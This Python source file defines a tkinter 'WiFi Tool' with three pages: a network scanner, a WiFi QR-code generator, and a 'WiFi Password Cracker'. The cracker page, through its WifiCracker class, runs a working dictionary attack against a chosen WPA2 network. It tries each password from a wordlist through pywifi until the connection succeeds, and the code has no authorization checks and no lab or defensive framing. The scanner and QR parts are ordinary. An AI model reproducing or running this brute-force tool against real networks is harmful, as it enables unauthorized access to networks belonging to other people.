import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import threading
import time
import pywifi
from pywifi import const
from PIL import Image, ImageTk
import qrcode

class WifiToolGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("WiFi Tool")
        self.root.geometry("600x500")

        self.home_frame = tk.Frame(root)
        self.home_frame.pack(fill="both", expand=True)

        self.scan_frame = tk.Frame(root)
        self.qr_frame = tk.Frame(root)
        self.crack_frame = tk.Frame(root)

        self.setup_home_page()
        self.setup_scan_page()
        self.setup_qr_page()
        self.setup_crack_page()

        self.wifi_cracker = None
        self.cracking_thread = None

    def setup_home_page(self):
        # Load background image
        self.bg_image = ImageTk.PhotoImage(file="home.png")

        # Create a label to display the background image
        self.bg_label = tk.Label(self.home_frame, image=self.bg_image)
        self.bg_label.place(x=0, y=0, width=600, height=570)

        # Create buttons with attractive colors and gaps between them
        self.scan_button = tk.Button(self.home_frame, text="Scan Wifi Networks",
            command=self.show_scan_page, bg="blue",fg="white")
        self.scan_button.place(x=450, y=10, width=120, height=30)

        self.cracker_button = tk.Button(self.home_frame, text="Wifi Password Cracker", 
            command=self.show_crack_page,bg="green", fg="white")
        self.cracker_button.place(x=450, y=50, width=122, height=30)

        self.qr_button = tk.Button(self.home_frame, text="WiFi QR Generator", 
            command=self.show_qr_page, bg="orange",fg="white")
        self.qr_button.place(x=450, y=90, width=120, height=30)

    def setup_scan_page(self):
        self.scan_networks_button = tk.Button(self.scan_frame, text="Scan Networks", 
            command=self.scan_networks,bg="blue", fg="white")
        self.scan_networks_button.pack(side="top", pady=10)

        # Frame to hold listboxes and scrollbar
        self.listbox_frame = tk.Frame(self.scan_frame)
        self.listbox_frame.pack(side="top", fill="both", expand=True, padx=10, pady=(10, 5))
        self.networks_listbox = tk.Listbox(self.listbox_frame, height=8, width=50)  
        self.networks_listbox.pack(side="left", fill="both", expand=True)
        self.scrollbar = ttk.Scrollbar(self.listbox_frame, orient="vertical",
             command=self.networks_listbox.yview)
        self.scrollbar.pack(side="right", fill="y")
        self.networks_listbox.config(yscrollcommand=self.scrollbar.set)
        self.details_listbox = tk.Listbox(self.scan_frame, height=8, width=50) 
        self.details_listbox.pack(side="bottom", fill="both", 
            expand=True, padx=10, pady=(5, 10))  
        self.networks_listbox.bind("<<ListboxSelect>>", self.show_network_details)
        self.details_label = tk.Label(self.scan_frame, text="Network Details")
        self.details_label.pack(side="bottom", pady=(5, 10))  # Adjusted pady
        self.back_button = tk.Button(self.scan_frame, text="Back to Home", 
            command=self.show_home_page, bg="red",fg="white")
        self.back_button.pack(side="bottom", pady=10)

    def setup_qr_page(self):
        self.qr_label = tk.Label(self.qr_frame, text="WiFi QR Generator",
             font=("Helvetica", 16, "bold"))
        self.qr_label.pack(pady=20)
        self.ssid_label = tk.Label(self.qr_frame, text="SSID:")
        self.ssid_label.pack(pady=5)
        self.ssid_entry = tk.Entry(self.qr_frame, width=30)
        self.ssid_entry.pack()
        self.password_label = tk.Label(self.qr_frame, text="Password:")
        self.password_label.pack(pady=5)
        self.password_entry = tk.Entry(self.qr_frame, width=30, show="*")
        self.password_entry.pack()
        self.generate_qr_button = tk.Button(self.qr_frame, text="Generate QR Code",
            command=self.generate_qr_code, bg="blue", fg="white")
        self.generate_qr_button.pack(pady=10)
        self.qr_code_label = tk.Label(self.qr_frame)
        self.qr_code_label.pack(pady=20)
        self.back_to_scan_button = tk.Button(self.qr_frame, text="Back to Scan",
            command=self.show_scan_page, bg="red",fg="white")
        self.back_to_scan_button.pack(pady=10)
        self.back_to_home_button = tk.Button(self.qr_frame, text="Back to Home",
            command=self.show_home_page, bg="red",fg="white")
        self.back_to_home_button.pack(pady=10)

    def setup_crack_page(self):
        self.crack_label = tk.Label(self.crack_frame, text="WiFi Password Cracker", 
            font=("Helvetica", 16, "bold"))
        self.crack_label.pack(pady=20)
        self.select_network_label = tk.Label(self.crack_frame, text="Select Network:")
        self.select_network_label.pack(pady=5)
        self.networks_combobox = ttk.Combobox(self.crack_frame, width=30, state="disabled")
        self.networks_combobox.pack()
        self.browse_label = tk.Label(self.crack_frame, text="Select Password Wordlist:")
        self.browse_label.pack(pady=5)
        self.password_file_entry = tk.Entry(self.crack_frame, width=30)  # Removed state="disabled"
        self.password_file_entry.pack()
        self.browse_button = tk.Button(self.crack_frame, text="Browse", 
            command=self.browse_password_file, bg="blue", fg="white")
        self.browse_button.pack(pady=10)
        self.start_cracking_button = tk.Button(self.crack_frame, text="Start Cracking",
             command=self.start_cracking, bg="green", fg="white")
        self.start_cracking_button.pack(pady=10)
        # Use a Text widget for status display instead of Label
        self.status_text = tk.Text(self.crack_frame, wrap="word", height=10, width=70)
        self.status_text.pack(padx=10, pady=10, fill="both", expand=True)
        self.status_scrollbar = ttk.Scrollbar(self.crack_frame, orient="vertical", 
            command=self.status_text.yview)
        self.status_scrollbar.pack(side="right", fill="y")
        self.status_text.config(yscrollcommand=self.status_scrollbar.set)
        self.back_to_home_button_crack = tk.Button(self.crack_frame, text="Back to Home", 
            command=self.show_home_page, bg="red", fg="white")
        self.back_to_home_button_crack.pack(pady=10)

    def scan_networks(self):
        self.networks_listbox.delete(0, "end")
        self.details_listbox.delete(0, "end")
        self.network_details = []
        # Function to perform WiFi scanning in a separate thread
        def perform_scan():
            try:
                wifi = pywifi.PyWiFi()
                iface = wifi.interfaces()[0]
                iface.scan()
                time.sleep(5)  # Wait for the scan to complete
                scan_results = iface.scan_results()
                for network in scan_results:
                    self.networks_listbox.insert("end", network.ssid)
                    self.network_details.append(network)
                # Enable combobox after scan results are populated
                self.networks_combobox.config(values=[network.ssid for network in scan_results])
                self.networks_combobox.config(state="readonly")
            except Exception as e:
                messagebox.showerror("Error", f"Error scanning networks: {str(e)}")
        # Start scanning in a new thread to avoid blocking the GUI
        scan_thread = threading.Thread(target=perform_scan)
        scan_thread.start()

    def show_network_details(self, event):
        # Clear previous details
        self.details_listbox.delete(0, "end")

        try:
            # Get selected network
            selected_network_index = self.networks_listbox.curselection()[0]
            selected_network = self.networks_listbox.get(selected_network_index)

            # Find the selected network details
            network_details = self.network_details[selected_network_index]

            # Display the details for the selected network
            self.details_listbox.insert("end", f"SSID: {network_details.ssid}")
            self.details_listbox.insert("end", f"BSSID: {network_details.bssid}")
            self.details_listbox.insert("end", f"Signal: {network_details.signal}")
            self.details_listbox.insert("end", f"Channel: {network_details.freq}")
            self.details_listbox.insert("end", f"Auth: {network_details.auth}")
            self.details_listbox.insert("end", f"Cipher: {network_details.cipher}")

        except IndexError:
            # Handle the case where no network is selected
            pass

    def generate_qr_code(self):
        ssid = self.ssid_entry.get()
        password = self.password_entry.get()

        if not ssid or not password:
            messagebox.showwarning("Input Error", "Please enter both SSID and password")
            return

        qr_data = f"WIFI:S:{ssid};T:WPA;P:{password};;"
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(qr_data)
        qr.make(fit=True)
        qr_img = qr.make_image(fill="black", back_color="white")

        qr_img.save("wifi_qr.png")

        # Display the QR code in the label
        qr_image = Image.open("wifi_qr.png")
        qr_photo = ImageTk.PhotoImage(qr_image)
        self.qr_code_label.config(image=qr_photo)
        self.qr_code_label.image = qr_photo

    def browse_password_file(self):
        password_file = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        print(f"Selected file: {password_file}")  # Debug print statement

        if password_file:
            print("File selected. Updating the entry widget.")
            self.password_file_entry.delete(0, "end")
            self.password_file_entry.insert(0, password_file)
            print(f"Entry updated with: {self.password_file_entry.get()}")  # Debug print statement
        else:
            print("No file selected.")  # Debug print statement

    def start_cracking(self):
        selected_network = self.networks_combobox.get()
        password_file = self.password_file_entry.get()

        if not selected_network or not password_file:
            messagebox.showwarning("Input Error", "Please select a network and password wordlist file")
            return

        self.status_text.delete("1.0", "end")

        self.wifi_cracker = WifiCracker(selected_network, password_file, self.status_text)
        self.cracking_thread = threading.Thread(target=self.wifi_cracker.crack_password)
        self.cracking_thread.start()

    def show_home_page(self):
        self.scan_frame.pack_forget()
        self.qr_frame.pack_forget()
        self.crack_frame.pack_forget()
        self.home_frame.pack(fill="both", expand=True)

    def show_scan_page(self):
        self.home_frame.pack_forget()
        self.qr_frame.pack_forget()
        self.crack_frame.pack_forget()
        self.scan_frame.pack(fill="both", expand=True)

    def show_qr_page(self):
        self.home_frame.pack_forget()
        self.scan_frame.pack_forget()
        self.crack_frame.pack_forget()
        self.qr_frame.pack(fill="both", expand=True)

    def show_crack_page(self):
        self.home_frame.pack_forget()
        self.scan_frame.pack_forget()
        self.qr_frame.pack_forget()
        self.crack_frame.pack(fill="both", expand=True)

class WifiCracker:
    def __init__(self, ssid, password_file, status_text):
        self.ssid = ssid
        self.password_file = password_file
        self.status_text = status_text

    def crack_password(self):
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]

        iface.disconnect()
        time.sleep(1)

        if iface.status() == const.IFACE_DISCONNECTED:
            with open(self.password_file, "r") as file:
                passwords = file.readlines()
                
            for password in passwords:
                password = password.strip()

                profile = pywifi.Profile()
                profile.ssid = self.ssid
                profile.auth = const.AUTH_ALG_OPEN
                profile.akm.append(const.AKM_TYPE_WPA2PSK)
                profile.cipher = const.CIPHER_TYPE_CCMP
                profile.key = password

                iface.remove_all_network_profiles()
                iface.connect(iface.add_network_profile(profile))

                start_time = time.time()
                while time.time() - start_time < 5:
                    if iface.status() == const.IFACE_CONNECTED:
                        self.status_text.insert("end", f"Password found: {password}\n")
                        self.status_text.see("end")
                        iface.disconnect()
                        return True
                    else:
                        self.status_text.insert("end", f"Trying password: {password}\n")
                        self.status_text.see("end")
                        time.sleep(1)

            self.status_text.insert("end", "Password not found in the wordlist\n")
            self.status_text.see("end")
            return False

if __name__ == "__main__":
    root = tk.Tk()
    app = WifiToolGUI(root)
    root.mainloop()
